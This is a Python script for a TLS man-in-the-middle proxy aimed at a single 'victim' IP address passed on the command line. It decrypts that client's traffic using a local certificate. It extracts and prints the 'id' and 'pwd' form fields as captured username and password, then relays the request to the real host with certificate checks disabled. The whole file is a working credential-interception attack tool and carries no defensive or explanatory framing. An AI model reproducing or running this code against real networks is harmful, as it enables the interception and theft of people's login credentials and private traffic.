#!/usr/bin/env python3

import re
import os
import ssl
import sys
import socket
import signal
import urllib.parse
import ipaddress

HOST = "0.0.0.0"
PORT = 8080

if len(sys.argv) < 2:
    sys.exit(1)


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(5)  

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="./certificates/host.crt", keyfile="./certificates/host.key")
ssl_server = context.wrap_socket(server_socket, server_side=True)


def child_work(client_socket):
    try:
        client_socket.settimeout(0.5)
        data = b""
        while True:
            try:
                chunk = client_socket.recv(8192)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break  

        decoded_data = data.decode(errors='ignore')
        # print(decoded_data)

        # Extract Host header using regex
        match = re.search(r"Host: (.*?)\r\n", decoded_data)
        body = decoded_data.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in decoded_data else ""
        parsed_data = urllib.parse.parse_qs(body)

        username = parsed_data.get("id", ["Unknown"])[0]
        password = parsed_data.get("pwd", ["Unknown"])[0]
        if username != "Unknown":
            print(f"id: {username} password: {password}")

        if match:
            destination_host = match.group(1)
            forward_socket = socket.create_connection((destination_host, 443))
            print(f"TLS Connection Established : [{socket.gethostbyname(destination_host)} : {443}]")

            client_ssl_context = ssl.create_default_context()
            client_ssl_context.check_hostname = False
            client_ssl_context.verify_mode = ssl.CERT_NONE
            forward_ssl = client_ssl_context.wrap_socket(forward_socket, server_hostname=destination_host)

            forward_ssl.sendall(data)

            forward_ssl.settimeout(2) 
            try:
                while True:
                    try:
                        response = forward_ssl.recv(8192)
                        if not response:  
                            break  
                        try:
                            client_socket.sendall(response)
                        except BrokenPipeError:
                            break  
                    except socket.timeout:
                        break  
            except Exception as e:
                print(f"[!] Error while receiving data: {e}")
            
            forward_ssl.close()
            
    except Exception as e:
        print(f"[!] Error: {e}")

    finally:
        client_socket.close() 

while True:
    client_socket, addr = ssl_server.accept()

    if addr[0] == sys.argv[1]:
        pid = os.fork()
        if pid == 0:  
            ssl_server.close()  
            child_work(client_socket)
            os._exit(0) 
        else:
            client_socket.close() 
    else: 
        print("Not Victim try to connect")